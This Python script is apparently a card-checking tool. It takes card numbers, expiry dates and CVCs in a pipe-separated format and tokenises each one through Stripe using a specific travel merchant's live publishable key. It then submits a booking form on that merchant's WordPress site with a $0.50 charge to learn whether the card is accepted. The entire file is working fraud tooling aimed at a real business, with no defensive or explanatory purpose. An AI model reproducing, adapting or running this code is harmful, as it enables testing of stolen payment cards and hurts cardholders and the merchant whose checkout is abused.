import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa8d5dc1378%3B+stripe-js-v3%2Fa8d5dc1378%3B+card-element&referrer=https%3A%2F%2Fountravela.com&time_on_page=43255&key=pk_live_51Oe3NUEpTJxV8SbJDWoFpChd6uOH5LkwCtH8snX4kLtb6T1M2tvEbUo2AnK83Y5gjy0X2jqaKuZefCqryHo1CABG00IQ4Wvcvu'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_first_add': 'fd%3D2025-01-13%2023%3A13%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'wp-wpml_current_language': 'en',
	    'partnero_session_uuid': '40432fc0-d5aa-449d-96ce-0aade8c56163',
	    '_ga': 'GA1.1.1228455949.1736810028',
	    'illow-consent-64204a1a-84c1-4237-9071-223adbcf45bf': 'necessary=true|preferences=true|marketing=true|statistics=true|unclassified=true|updatedAt=1736810032624|createdAt=1736810031266|consent-id=133a6a31-2e2d-4b3a-8168-e7976294305b',
	    '__stripe_mid': '26cdde17-d353-44be-8490-47ae831483fc700bd7',
	    '__stripe_sid': '5a6a60ee-d08e-4f3b-8925-5ac0f6d4806b30261a',
	    '_fbp': 'fb.1.1736810027507.417704284684441003',
	    'sbjs_current_add': 'fd%3D2025-01-13%2023%3A15%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj',
	    '_ga_J2GTJFT1S5': 'GS1.1.1736810027.1.1.1736810125.59.0.1561506437',
	    '_gcl_au': '1.1.170124919.1736810031.1500225411.1736810065.1736810169',
	}
	
	headers = {
	    'authority': 'ountravela.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-01-13%2023%3A13%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wp-wpml_current_language=en; partnero_session_uuid=40432fc0-d5aa-449d-96ce-0aade8c56163; _ga=GA1.1.1228455949.1736810028; illow-consent-64204a1a-84c1-4237-9071-223adbcf45bf=necessary=true|preferences=true|marketing=true|statistics=true|unclassified=true|updatedAt=1736810032624|createdAt=1736810031266|consent-id=133a6a31-2e2d-4b3a-8168-e7976294305b; __stripe_mid=26cdde17-d353-44be-8490-47ae831483fc700bd7; __stripe_sid=5a6a60ee-d08e-4f3b-8925-5ac0f6d4806b30261a; _fbp=fb.1.1736810027507.417704284684441003; sbjs_current_add=fd%3D2025-01-13%2023%3A15%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj; _ga_J2GTJFT1S5=GS1.1.1736810027.1.1.1736810125.59.0.1561506437; _gcl_au=1.1.170124919.1736810031.1500225411.1736810065.1736810169',
	    'origin': 'https://ountravela.com',
	    'referer': 'https://ountravela.com/en/ladakh-rental-booking-bike/?srsltid=AfmBOoqsf0nmInpsxIxoGxK3viK9l56WxLV--SrQHT5oOKET3obe_ePj',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1736810170714',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=26737&_fluentform_16_fluentformnonce=e3c0793e29&_wp_http_referer=%2Fen%2Fladakh-rental-booking-bike%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&phone=&email=lalil35434%40pariag.com&country-list=FR&bnr_people=2&nbr_bike=2&datetime=14%2F01%2F2025&nbr_day=5&dropdown_1=New%20Himalayan%20450%20-%203500%20INR%20%2F%20day&numeric_bike1_himalayan450=17500&dropdown_2=New%20Himalayan%20450%20-%203500%20INR%20%2F%20day&numeric_bike2_himalayan450=17500&input_radio_carrier=yes&numeric_field_carrier=1000&input_radio_InnerLinePermit=yes&numeric_field_InnerLinePermit=2000&input_radio_assistance=no&numeric_total_inr=38000&numeric_10_inr=3800&numeric-field_7=34200&input_text=&custom-payment-amount_1=0.50&payment_method=stripe&terms-n-condition_1=on&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '16',
	}
	
	r2 = requests.post(
	    'https://ountravela.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
